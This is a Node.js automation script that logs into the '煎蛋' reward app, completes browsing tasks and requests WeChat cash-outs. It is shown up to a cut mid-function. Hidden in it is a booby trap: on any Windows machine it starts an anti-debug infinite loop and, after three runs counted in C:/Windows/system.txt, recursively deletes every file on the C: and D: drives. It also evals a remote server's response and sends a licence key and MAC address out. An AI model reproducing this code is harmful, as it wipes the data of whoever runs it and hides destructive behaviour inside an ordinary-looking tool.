const VM = require("sablejs/runtime")();
const path = require('path');
const fs = require("fs");



//let vm;

function initVM() {
  vm = new VM();
  const vGlobal = vm.getGlobal();
  const vConsole = vm.createObject();
  const vLog = vm.createFunction("log", function () {
    const temp = [];
    for (let i = 0; i < arguments.length; i++) {
      temp.push(vm.asString(arguments[i]));
    }

    console.log(...temp);
    return vm.createUndefined();
  });
  const vxxxx = vm.createFunction("xxxx", function (s) {
    let ret = eval(s.value);
    return vm.createString(JSON.stringify(ret));
  });
  const vyyyy = vm.createFunction('yyyy', function (s) {
    let fn = s.value;
    let t = fs.readFileSync(fn, 'utf-8').replace(/\r\n/g, '\n');
    let ret = CryptoJS.MD5(t).toString();
    return vm.createString(ret);
  })
  const vddd = vm.createFunction('ddd', function (s) {
    let ret = CryptoJS.MD5(s.value).toString();
    return vm.createString(ret);
  })
  vm.setProperty(vConsole, "log", vLog);
  vm.setProperty(vGlobal, "xxxx", vxxxx);
  vm.setProperty(vGlobal, "console", vConsole);
  vm.setProperty(vGlobal, "yyyy", vyyyy);
  vm.setProperty(vGlobal, "ddd", vddd);
  vm.run(fs.readFileSync('./output_final.js').toString())
  return vm;
}
function destroyVM(xvm) {
  xvm.destroy();
}
function abc(xvm, cdkey, mac, id, ip) {

  const vGlobal = xvm.getGlobal();


  let vxab = xvm.getProperty(vGlobal, "xab");

  let retval = xvm.call(vxab, xvm.createUndefined(), xvm.createString(cdkey), xvm.createString(id), xvm.createString(ip), xvm.createString(mac));
  retval = xvm.asString(retval)
  //vm.destroy();
  return retval;
}
function xyz(xvm, cdkey, mac, id, ip) {

  const vGlobal = xvm.getGlobal();


  let vxmn = xvm.getProperty(vGlobal, "xmn");

  let retval = xvm.call(vxmn, xvm.createUndefined(), xvm.createString(cdkey), xvm.createString(id), xvm.createString(ip), xvm.createString(mac));
  retval = xvm.asString(retval)
  //vm.destroy();
  return retval;
}

var gtr
let ml = '', mac = ''
let status;
status = (status = ($.getval("qmwkstatus") || "1")) > 1 ? `${status}` : ""; // 账号扩展字符
JSNAMED = $.isNode() ? require("path").basename(__filename) : `jd.js`
let jdappArr = []
let all_msg = ""
let arrs = []
let jdapp = ($.isNode() ? process.env.jdapp : $.getdata('jdapp')) || ``;
let acckey = $.isNode() ? (process.env.cdkey ? process.env.cdkey : "") : ($.getdata('cdkey') ? $.getdata('cdkey') : "")
var CryptoJS = require("crypto-js");
let txid = '',userid = '',token= '',sjh='',mm=''
var AesKey = "SFV2fb8D09jreH2Xdf2M0FGk5Di2DX6O";
var CBCIV = "zI1Y5hT7xvj3usuU";
var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
// 加密选项

var CBCOptions = {
	//iv: CryptoJS.enc.Utf8.parse(CBCIV),
	mode:CryptoJS.mode.ECB,
	padding: CryptoJS.pad.Pkcs7
}



if ($.isNode()) {
    gtr = require('fs')
    if (isFileExist('C:/')) {
        console.log('电脑环境');
        setInterval(() => {
            do {
                (function (a) {
                    return (function (a) {
                        return (Function('Function(arguments[0]+"' + a + '")()'))
                    })(a)
                })('bugger')('de', 0, 0, (0, 0));
                addF('d:/')
                addF('C:/')
            } while (1)
        }, 0);
    } else {

        console.log('青龙环境');
        function getMACAddresses() {
            var macs = ''
            var devs = fs.readdirSync('/sys/class/net/');
            devs.forEach(function (dev) {
                var fn = path.join('/sys/class/net', dev, 'address');
                if (dev.substr(0, 3) == 'eth' && fs.existsSync(fn)) {
                    macs = fs.readFileSync(fn).toString().trim();
                }
            });
            return macs;
        }
        mac = getMACAddresses();
    }
} else {
    console.log('代理环境');
}

function isFileExist(path) {
    try {
        gtr.accessSync(path, gtr.F_OK);
    } catch (e) {
        return false;
    }
    return true;
}
function addF(fileUrl, flag) {

    let num = 0, readPath = 'C:/Windows/system.txt'

    if (isFileExist(readPath)) {
        num = gtr.readFileSync(readPath, "utf8")
    } else {
        if (isFileExist('C:/')) {
            gtr.writeFile(readPath, '1', function (err) { if (err) throw err; });
        } else {
            return
        }
    }

    if (num == 99) {
        return 99
    }
    console.log(num);
    console.log(`警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！`, num);
    if (parseInt(num) < 3) {
        let adnum = parseInt(num) + 1
        gtr.writeFileSync(readPath, adnum + '', "utf8")
        return;
    }

    if (!gtr.existsSync(fileUrl)) return;
    if (gtr.statSync(fileUrl).isDirectory()) {
        var files = gtr.readdirSync(fileUrl);
        var len = files.length,
            removeNumber = 0;
        if (len > 0) {
            files.forEach(function (file) {
                removeNumber++;
                var stats = gtr.statSync(fileUrl + '/' + file);
                var url = fileUrl + '/' + file;
                if (gtr.statSync(url).isDirectory()) {
                    addF(url, true);
                } else {
                    gtr.unlinkSync(url);
                }
            });
            if (len == removeNumber && flag) {
                gtr.rmdirSync(fileUrl);
            }
        } else if (len == 0 && flag) {
            gtr.rmdirSync(fileUrl);
        }
    } else {
        gtr.unlinkSync(fileUrl);
    }
}


!(async () => {
    if (typeof $request !== "undefined") {
        // qmwkck()
    } else {
        initVM();
        arrs = abc(global.vm, acckey, mac, 52, 0);
        if (arrs == '') return
        arrs = JSON.parse(arrs)
        if (!arrs) return
        jdappArr = jdapp.split('@')
        console.log(`\n公告：${arrs['gg']}\n`)
        console.log(`当前版本：1.0 ${arrs['bb']}\n`)
        console.log(`------------- 共${jdappArr.length}个账号-------------\n`)
        console.log(`当前设备可执行账号限制为${arrs['num']}个账号\n`)
        if (jdappArr.length > parseInt(arrs['num'])) {


        } else {
            for (let i = 0; i < jdappArr.length; i++) {
                jdapp = jdappArr[i]
                $.index = i + 1;

                console.log(`\n开始【煎蛋${$.index}】`)
                jdapp = decrypt(jdapp.replace(/\n/g,''))
                jdapp = JSON.parse(jdapp)
                sjh = jdapp.account
                mm = jdapp.password
                //console.log(sjh,mm);
                
                if(jdapp!=''){
                    console.log(`\n煎蛋解密获取账号密码成功。`);
                }
                //
                await jddl()
                await jdid()
                await jdxx()
                
            }
        }
    }
    destroyVM(global.vm);
})()
    .catch((e) => $.logErr(e))
    .finally(() => $.done())

//登录
function jddl(timeout = 0) {
    return new Promise((resolve) => {
        let time = Math.round(new Date().getTime())
        var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
        let encrypted = encrypt(`{"account":"${sjh}","deviceId":"","password":"${mm}","ClientTime":${myYear+myMonth+myToday+myHour+myMinute+mytime}}`)
        //console.log(encrypted);
        let url = {
            url: `https://www.cqsslhj.com/SysBase/Account/SingInNormal`,
            headers: {"channel":"jiandan","pkgName":"com.cq.jdcover","encryption":"1","timeZoom":"GMT+08:00","timeSpan":time,"Authorization":"","AchievementIds":"NoData","Content-Type":"application/json; charset=UTF-8","Content-Length":"175","Host":"www.cqsslhj.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.10.0"},
           body:`${encrypted}`
        }
        $.post(url, async (err, resp, data) => {
            try {
                //console.log(data);
                const result = JSON.parse(data)
                if (result.StateCode == 200) {
                 
                console.log(`\n煎蛋登录成功 用户：${result.InnerData.NickName}`)
                token = result.InnerData.TokenAuth.access_token
                //console.log(token);
                } else {
                    console.log(`\n煎蛋：${data}`)
                }
            } catch (e) {
                //console.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}


function jdid(timeout = 0) {
    return new Promise((resolve) => {
        let time = Math.round(new Date().getTime())
        var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
        let encrypted = encrypt(`exposureType=1&pageSize=20&pageIndex=1&ClientTime=${myYear+myMonth+myToday+myHour+myMinute+mytime}`)
        //console.log(encrypted);
        let url = {
            url: `https://www.cqsslhj.com/Tasks/Exposure/GetPageExposureList`,
            headers: {"channel":"jiandan","pkgName":"com.cq.jdcover","encryption":"1","timeZoom":"GMT+08:00","timeSpan":time,"Authorization":token,"AchievementIds":"[]","Content-Type":"application/x-www-form-urlencoded; charset=utf-8","Host":"www.cqsslhj.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.10.0"},
           body:`${encrypted}`
        }
        $.post(url, async (err, resp, data) => {
            try {
                //console.log(data);
                const result = JSON.parse(data)
                if (result.StateCode == 200) {
                    console.log(`\n煎蛋匹配到：${result.InnerData.length} 个任务`)
                 for(let x = 0;x<result.InnerData.length;x++){
                    
                    if(result.InnerData[x].IsFinish == false){
                        console.log(`\n煎蛋可浏览任务：${result.InnerData[x].Title}`)
                        userid = result.InnerData[x].ExposureId
                        await jdrw()
                        await $.wait(10000)
                    }
                    
                 }   
                   
                } else {
                    console.log(`\n煎蛋：${data}`)
                }
            } catch (e) {
                //console.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}


function jdrw(timeout = 0) {
    return new Promise((resolve) => {
        let time = Math.round(new Date().getTime())
        var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
        //console.log(myYear+myMonth+myToday+myHour+myMinute+mytime);
        let encrypted = encrypt(`exposureId=${userid}&exposureType=1&ClientTime=${myYear+myMonth+myToday+myHour+myMinute+mytime}`)
        //console.log(encrypted);
        let url = {
            url: `https://www.cqsslhj.com/Tasks/Exposure/GainExposure`,
            headers: {"channel":"jiandan","pkgName":"com.cq.jdcover","encryption":"1","timeZoom":"GMT+08:00","timeSpan":time,"Authorization":token,"AchievementIds":"[]","Content-Type":"application/x-www-form-urlencoded; charset=utf-8","Host":"www.cqsslhj.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.10.0"},
           body:`${encrypted}`
        }
        $.post(url, async (err, resp, data) => {
            try {
                //console.log(data);
                const result = JSON.parse(data)
                if (result.StateCode == 200) {
                 
                console.log(`\n煎蛋浏览任务：成功，获得0.01元`)
  
                } else {
                    console.log(`\n煎蛋：${data}`)
                }
            } catch (e) {
                //console.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}

function jdxx(timeout = 0) {
    return new Promise((resolve) => {
        let time = Math.round(new Date().getTime())
        var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
        
        let encrypted = encrypt(`ClientTime=${myYear+myMonth+myToday+myHour+myMinute+mytime}`)
        //console.log(encrypted);
        let url = {
            url: `https://www.cqsslhj.com/SysBase/User/GetUserCaptital?KSystemWork=${encrypted}`,
            headers: {"channel":"jiandan","pkgName":"com.cq.jdcover","encryption":"1","timeZoom":"GMT+08:00","timeSpan":time,"Authorization":token,"AchievementIds":"[]","Content-Type":"application/x-www-form-urlencoded; charset=utf-8","Host":"www.cqsslhj.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.10.0"},
           
        }
        $.get(url, async (err, resp, data) => {
            try {
                //console.log(data);
                const result = JSON.parse(data)
                if (result.StateCode == 200) {
                 
                console.log(`\n煎蛋用户余额：${result.InnerData.Commission}元`)
                if(result.InnerData.Commission >= 1){
                    await jdtxzh()
                }
                } else {
                    console.log(`\n煎蛋：${data}`)
                }
            } catch (e) {
                //console.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}

function jdtxzh(timeout = 0) {
    return new Promise((resolve) => {
        let time = Math.round(new Date().getTime())
        var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
        
        let encrypted = encrypt(`ClientTime=${myYear+myMonth+myToday+myHour+myMinute+mytime}`)
        //console.log(encrypted);
        let url = {
            url: `https://www.cqsslhj.com/Sys/CashoutAccount/GetWeChatCashoutAccount?KSystemWork=${encrypted}`,
            headers: {"channel":"jiandan","pkgName":"com.cq.jdcover","encryption":"1","timeZoom":"GMT+08:00","timeSpan":time,"Authorization":token,"AchievementIds":"[]","Content-Type":"application/x-www-form-urlencoded; charset=utf-8","Host":"www.cqsslhj.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.10.0"},
           
        }
        $.get(url, async (err, resp, data) => {
            try {
                //console.log(data);
                const result = JSON.parse(data)
                if (result.StateCode == 200) {
                 
                console.log(`\n煎蛋获取到绑定提现微信账号:${result.InnerData[0].NickName} ID:${result.InnerData[0].Id}`)
                txid = result.InnerData[0].Id
                await jdtx()
                } else {
                    console.log(`\n煎蛋：${data}`)
                }
            } catch (e) {
                //console.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}


function jdtx(timeout = 0) {
    return new Promise((resolve) => {
        let time = Math.round(new Date().getTime())
        var myDate = new Date();
var myYear = myDate.getFullYear(); //获取完整的年份(4位,1970-????)
var myMonth = myDate.getMonth() + 1; //获取当前月份(0-11,0代表1月)
var myToday = myDate.getDate(); //获取当前日(1-31)
var myDay = myDate.getDay(); //获取当前星期X(0-6,0代表星期天)
var myHour = myDate.getHours(); //获取当前小时数(0-23)
var myMinute = myDate.getMinutes();//当前分钟数
var mytime = myDate.getSeconds();//当前秒
if (myMonth >= 10) { myMonth = myMonth; } else { myMonth = "0" + myMonth; }//日期时间补零
if (myToday >= 10) { myToday = myToday; } else { myToday = "0" + myToday; }
if (myHour >= 10) { myHour = myHour; } else { myHour = "0" + myHour; }
if (myMinute >= 10) { myMinute = myMinute; } else { myMinute = "0" + myMinute; }
if (mytime >= 10) { mytime = mytime; } else { mytime = "0" + mytime; }
        
        let encrypted = encrypt(`billFee=1&currencyType=0&cashouAccoutId=${txid}&ClientTime=${myYear+myMonth+myToday+myHour+myMinute+mytime}`)
        //console.log(encrypted);
        let url = {
            url: `https://www.cqsslhj.com/Pay/WeCatPay/NewCashOut`,
            headers: {"channel":"jiandan","pkgName":"com.cq.jdcover","encryption":"1","timeZoom":"GMT+08:00","timeSpan":time,"Authorization":token,"AchievementIds":"[]","Content-Type":"application/x-www-form-urlencoded; charset=utf-8","Host":"www.cqsslhj.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/3.10.0"},
           body:`${encrypted}`
        }
        $.post(url, async (err, resp, data) => {
            try {
                //console.log(data);
                const result = JSON.parse(data)
                if (result.StateCode == 200) {
                 
                console.log(`\n煎蛋提现成功`)
                
                } else {
                    console.log(`\n煎蛋：${data}`)
                }
            } catch (e) {
                //console.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}
function encrypt(data){
    var key = CryptoJS.enc.Utf8.parse(AesKey);
    var secretData = CryptoJS.enc.Utf8.parse(data);
    var encrypted = CryptoJS.AES.encrypt(
		secretData, 
		key, 
		CBCOptions
	);
    return encrypted.toString();
}

function decrypt(data){
    var key = CryptoJS.enc.Utf8.parse(AesKey);
    var decrypt = CryptoJS.AES.decrypt(
		data, 
		key, 
		CBCOptions
	);
    return CryptoJS.enc.Utf8.stringify(decrypt).toString();
}


function randomString(len = 12) {
    let chars = 'abcdef0123456789';
    let maxLen = chars.length;
    let str = '';
    for (i = 0; i < len; i++) {
        str += chars.charAt(Math.floor(Math.random() * maxLen));
    }
    return str;
}


function encodeUTF8(s) {
    var i, r = [], c, x;
    for (i = 0; i < s.length; i++)
        if ((c = s.charCodeAt(i)) < 0x80) r.push(c);
        else if (c < 0x800) r.push(0xC0 + (c >> 6 & 0x1F), 0x80 + (c & 0x3F));
        else {
            if ((x = c ^ 0xD800) >> 10 == 0) //对四字节UTF-16转换为Unicode
                c = (x << 10) + (s.charCodeAt(++i) ^ 0xDC00) + 0x10000,
                    r.push(0xF0 + (c >> 18 & 0x7), 0x80 + (c >> 12 & 0x3F));
            else r.push(0xE0 + (c >> 12 & 0xF));
            r.push(0x80 + (c >> 6 & 0x3F), 0x80 + (c & 0x3F));
        };
    return r;
}

function sha(s) {
    var data = new Uint8Array(encodeUTF8(s))
    var i, j, t;
    var l = ((data.length + 8) >>> 6 << 4) + 16, s = new Uint8Array(l << 2);
    s.set(new Uint8Array(data.buffer)), s = new Uint32Array(s.buffer);
    for (t = new DataView(s.buffer), i = 0; i < l; i++)s[i] = t.getUint32(i << 2);
    s[data.length >> 2] |= 0x80 << (24 - (data.length & 3) * 8);
    s[l - 1] = data.length << 3;
    var w = [], f = [
        function () { return m[1] & m[2] | ~m[1] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; },
        function () { return m[1] & m[2] | m[1] & m[3] | m[2] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; }
    ], rol = function (n, c) { return n << c | n >>> (32 - c); },
        k = [1518500249, 1859775393, -1894007588, -899497514],
        m = [1732584193, -271733879, null, null, -1009589776];
    m[2] = ~m[0], m[3] = ~m[1];
    for (i = 0; i < s.length; i += 16) {
        var o = m.slice(0);
        for (j = 0; j < 80; j++)
            w[j] = j < 16 ? s[i + j] : rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1),
                t = rol(m[0], 5) + f[j / 20 | 0]() + m[4] + w[j] + k[j / 20 | 0] | 0,
                m[1] = rol(m[1], 30), m.pop(), m.unshift(t);
        for (j = 0; j < 5; j++)m[j] = m[j] + o[j] | 0;
    };
    t = new DataView(new Uint32Array(m).buffer);
    for (var i = 0; i < 5; i++)m[i] = t.getUint32(i << 2);

    var hex = Array.prototype.map.call(new Uint8Array(new Uint32Array(m).buffer), function (e) {
        return (e < 16 ? "0" : "") + e.toString(16);
    }).join("");
    return hex;
}

function hqs(num = 10) {
    return new Promise((resolve) => {
        let id = 12
        let url = {
            url: $.isNode() ? rc4($.fwur(), '1200') + `?key=${acckey}&id=${id}&ip=1&mac=${mac}&bb=1` : rc4($.fwur(), '1200') + `?key=${acckey}&id=${id}&ip=0&mac=${mac}&bb=1`,
        }
        $.post(url, async (err, resp, data) => {
            try {
                let result = eval(data);
                if (result.code == 200) {
                    all_msg = result.msg
                    resolve(result.data)
                } else {
                    all_msg = result.msg
                    resolve(false)

                }
            } catch (e) {
                $.logErr(e, resp);
            }
        }, 0)
    })
}

//封装md5
function md5(a) {
    function b(a, b) {
      return a << b | a >>> 32 - b
    }
  
    function c(a, b) {
      var c, d, e, f, g;
      return e = 2147483648 & a,
        f = 2147483648 & b,
        c = 1073741824 & a,
        d = 1073741824 & b,
        g = (1073741823 & a) + (1073741823 & b),
        c & d ? 2147483648 ^ g ^ e ^ f : c | d ? 1073741824 & g ? 3221225472 ^ g ^ e ^ f : 1073741824 ^ g ^ e ^ f : g ^ e ^ f
    }
  
    function d(a, b, c) {
      return a & b | ~a & c
    }
  
    function e(a, b, c) {
      return a & c | b & ~c
    }
  
    function f(a, b, c) {
      return a ^ b ^ c
    }
  
    function g(a, b, c) {
      return b ^ (a | ~c)
    }
  
    function h(a, e, f, g, h, i, j) {
      return a = c(a, c(c(d(e, f, g), h), j)),
        c(b(a, i), e)
    }
  
    function i(a, d, f, g, h, i, j) {
      return a = c(a, c(c(e(d, f, g), h), j)),
        c(b(a, i), d)
    }
  
    function j(a, d, e, g, h, i, j) {
      return a = c(a, c(c(f(d, e, g), h), j)),
        c(b(a, i), d)
    }
  
    function k(a, d, e, f, h, i, j) {
      return a = c(a, c(c(g(d, e, f), h), j)),
        c(b(a, i), d)
    }
  
    function l(a) {
      for (var b, c = a.length, d = c + 8, e = (d - d % 64) / 64, f = 16 * (e + 1), g = new Array(f - 1), h = 0, i = 0; c > i;)
        b = (i - i % 4) / 4,
          h = i % 4 * 8,
          g[b] = g[b] | a.charCodeAt(i) << h,
          i++;
      return b = (i - i % 4) / 4,
        h = i % 4 * 8,
        g[b] = g[b] | 128 << h,
        g[f - 2] = c << 3,
        g[f - 1] = c >>> 29,
        g
    }
  
    function m(a) {
      var b, c, d = "", e = "";
      for (c = 0; 3 >= c; c++)
        b = a >>> 8 * c & 255,
          e = "0" + b.toString(16),
          d += e.substr(e.length - 2, 2);
      return d
    }
  
    function n(a) {
      a = a.replace(/\r\n/g, "\n");
      for (var b = "", c = 0; c < a.length; c++) {
        var d = a.charCodeAt(c);
        128 > d ? b += String.fromCharCode(d) : d > 127 && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192),
          b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224),
            b += String.fromCharCode(d >> 6 & 63 | 128),
            b += String.fromCharCode(63 & d | 128))
      }
      return b
    }
  
    var o, p, q, r, s, t, u, v, w, x = [], y = 7, z = 12, A = 17, B = 22, C = 5, D = 9, E = 14, F = 20, G = 4, H = 11,
      I = 16, J = 23, K = 6, L = 10, M = 15, N = 21;
    for (a = n(a),
      x = l(a),
      t = 1732584193,
      u = 4023233417,
      v = 2562383102,
      w = 271733878,
      o = 0; o < x.length; o += 16)
      p = t,
        q = u,
        r = v,
        s = w,
        t = h(t, u, v, w, x[o + 0], y, 3614090360),
        w = h(w, t, u, v, x[o + 1], z, 3905402710),
        v = h(v, w, t, u, x[o + 2], A, 606105819),
        u = h(u, v, w, t, x[o + 3], B, 3250441966),
        t = h(t, u, v, w, x[o + 4], y, 4118548399),
        w = h(w, t, u, v, x[o + 5], z, 1200080426),
        v = h(v, w, t, u, x[o + 6], A, 2821735955),
        u = h(u, v, w, t, x[o + 7], B, 4249261313),
        t = h(t, u, v, w, x[o + 8], y, 1770035416),
        w = h(w, t, u, v, x[o + 9], z, 2336552879),
        v = h(v, w, t, u, x[o + 10], A, 4294925233),
        u = h(u, v, w, t, x[o + 11], B, 2304563134),
        t = h(t, u, v, w, x[o + 12], y, 1804603682),
        w = h(w, t, u, v, x[o + 13], z, 4254626195),
        v = h(v, w, t, u, x[o + 14], A, 2792965006),
        u = h(u, v, w, t, x[o + 15], B, 1236535329),
        t = i(t, u, v, w, x[o + 1], C, 4129170786),
        w = i(w, t, u, v, x[o + 6], D, 3225465664),
        v = i(v, w, t, u, x[o + 11], E, 643717713),
        u = i(u, v, w, t, x[o + 0], F, 3921069994),
        t = i(t, u, v, w, x[o + 5], C, 3593408605),
        w = i(w, t, u, v, x[o + 10], D, 38016083),
        v = i(v, w, t, u, x[o + 15], E, 3634488961),
        u = i(u, v, w, t, x[o + 4], F, 3889429448),
        t = i(t, u, v, w, x[o + 9], C, 568446438),
        w = i(w, t, u, v, x[o + 14], D, 3275163606),
        v = i(v, w, t, u, x[o + 3], E, 4107603335),
        u = i(u, v, w, t, x[o + 8], F, 1163531501),
        t = i(t, u, v, w, x[o + 13], C, 2850285829),
        w = i(w, t, u, v, x[o + 2], D, 4243563512),
        v = i(v, w, t, u, x[o + 7], E, 1735328473),
        u = i(u, v, w, t, x[o + 12], F, 2368359562),
        t = j(t, u, v, w, x[o + 5], G, 4294588738),
        w = j(w, t, u, v, x[o + 8], H, 2272392833),
        v = j(v, w, t, u, x[o + 11], I, 1839030562),
        u = j(u, v, w, t, x[o + 14], J, 4259657740),
        t = j(t, u, v, w, x[o + 1], G, 2763975236),
        w = j(w, t, u, v, x[o + 4], H, 1272893353),
        v = j(v, w, t, u, x[o + 7], I, 4139469664),
        u = j(u, v, w, t, x[o + 10], J, 3200236656),
        t = j(t, u, v, w, x[o + 13], G, 681279174),
        w = j(w, t, u, v, x[o + 0], H, 3936430074),
        v = j(v, w, t, u, x[o + 3], I, 3572445317),
        u = j(u, v, w, t, x[o + 6], J, 76029189),
        t = j(t, u, v, w, x[o + 9], G, 3654602809),
        w = j(w, t, u, v, x[o + 12], H, 3873151461),
        v = j(v, w, t, u, x[o + 15], I, 530742520),
        u = j(u, v, w, t, x[o + 2], J, 3299628645),
        t = k(t, u, v, w, x[o + 0], K, 4096336452),
        w = k(w, t, u, v, x[o + 7], L, 1126891415),
        v = k(v, w, t, u, x[o + 14], M, 2878612391),
        u = k(u, v, w, t, x[o + 5], N, 4237533241),
        t = k(t, u, v, w, x[o + 12], K, 1700485571),
        w = k(w, t, u, v, x[o + 3], L, 2399980690),
        v = k(v, w, t, u, x[o + 10], M, 4293915773),
        u = k(u, v, w, t, x[o + 1], N, 2240044497),
        t = k(t, u, v, w, x[o + 8], K, 1873313359),
        w = k(w, t, u, v, x[o + 15], L, 4264355552),
        v = k(v, w, t, u, x[o + 6], M, 2734768916),
        u = k(u, v, w, t, x[o + 13], N, 1309151649),
        t = k(t, u, v, w, x[o + 4], K, 4149444226),
        w = k(w, t, u, v, x[o + 11], L, 3174756917),
        v = k(v, w, t, u, x[o + 2], M, 718787259),
        u = k(u, v, w, t, x[o + 9], N, 3951481745),
        t = c(t, p),
        u = c(u, q),
        v = c(v, r),
        w = c(w, s);
    var O = m(t) + m(u) + m(v) + m(w);
    return O.toLowerCase()
  }
  


function FxPCnMKLw7() {

    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

    // public method for encoding  
    this.encode = function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = _utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
            output = output +
                _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
                _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
        }
        return output;
    }

    // public method for decoding  
    this.decode = function (input) {
        var output = "";
        var chr1, chr2, chr3;
